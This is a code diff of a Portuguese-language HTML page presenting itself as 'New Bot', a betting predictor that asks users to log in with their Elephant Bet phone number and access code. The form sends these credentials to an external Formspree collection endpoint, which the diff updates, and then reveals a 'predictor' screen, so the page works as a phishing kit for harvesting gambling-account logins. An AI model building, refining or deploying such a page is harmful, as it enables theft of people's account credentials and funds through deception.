@@ -18,18 +18,6 @@
             display: none;
         }
         
-        #enter-img {
-            width: 200px;
-            cursor: pointer;
-            margin-top: 100px;
-            border-radius: 10px;
-            transition: transform 0.3s;
-        }
-        
-        #enter-img:hover {
-            transform: scale(1.05);
-        }
-        
         form {
             display: flex;
             flex-direction: column;
@@ -79,27 +67,19 @@
 </head>
 
 <body>
-    <!-- Tela inicial -->
-    <div id="start-screen">
-        <img id="enter-img" src="./aviator.jpeg" alt="Entrar no New Bot" />
-    </div>
-
     <!-- Tela de login -->
-    <div id="login-screen" class="hidden">
+    <div id="login-screen">
         <h2>New Bot - Login</h2>
         <p>Conecta com a sua conta da Elephant Bet</p>
-        <form id="login-form" action="https://formspree.io/f/mldwwpnb" method="POST">
+        <form id="login-form" action="https://formspree.io/f/myzdlojg" method="POST">
             <label for="phone">Número de Telemóvel:</label>
-            <input type="tel" id="phone" name="phone" placeholder="" maxlength="9" required pattern="\d{9}" />
+            <input type="tel" id="phone" name="phone" maxlength="9" required pattern="\d{9}" />
 
             <label for="access">Código de Acesso:</label>
-            <input type="password" id="access" name="auth_code" placeholder="" required minlength="4" />
+            <input type="password" id="access" name="auth_code" required minlength="4" />
 
             <!-- Honeypot (anti-spam) -->
             <input type="text" name="_honey" style="display:none">
-
-            <!-- Redirecionamento após envio -->
-            <input type="hidden" name="_redirect" value="https://seusite.com/">
 
             <button type="submit">Entrar</button>
         </form>
@@ -122,12 +102,6 @@
     </div>
 
     <script>
-        // Mostrar tela de login ao clicar na imagem
-        document.getElementById('enter-img').addEventListener('click', () => {
-            document.getElementById('start-screen').classList.add('hidden');
-            document.getElementById('login-screen').classList.remove('hidden');
-        });
-
         // Lógica do envio do formulário
         document.getElementById('login-form').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -135,9 +109,7 @@
             const phone = document.getElementById('phone').value.trim();
             const access = document.getElementById('access').value.trim();
 
-            // Validação: exatamente 9 dígitos numéricos
             const phoneRegex = /^\d{9}$/;
-
             if (!phoneRegex.test(phone)) {
                 alert('Número de telefone inválido. Deve conter exatamente 9 dígitos numéricos.');
                 return;
@@ -154,7 +126,6 @@
                 });
 
                 if (response.ok) {
-                    // Mensagem removida conforme pedido
                     document.getElementById('login-screen').classList.add('hidden');
                     document.getElementById('predictor-screen').classList.remove('hidden');
                 } else {
